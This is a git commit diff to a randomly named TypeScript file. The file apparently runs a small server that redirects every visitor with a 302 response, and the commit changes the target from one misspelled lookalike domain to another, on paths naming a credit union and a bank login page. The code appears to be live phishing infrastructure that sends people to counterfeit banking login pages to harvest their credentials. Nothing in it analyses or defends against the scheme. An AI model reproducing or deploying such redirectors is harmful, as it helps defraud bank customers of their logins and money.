6a80c9718c402e98653854cc51ec20b12902246b
Havillah1010 <agentpatrickjones@gmail.com>
2025-11-09 10:46:38 +0100

    Update potl4tch5vvc.ts

--- potl4tch5vvc.ts
+++ potl4tch5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://accesunacctonline.info/sunward/fcu/",
+      Location: "https://acerevieaw.biz/bmo/login_/",
     },
   });
 });
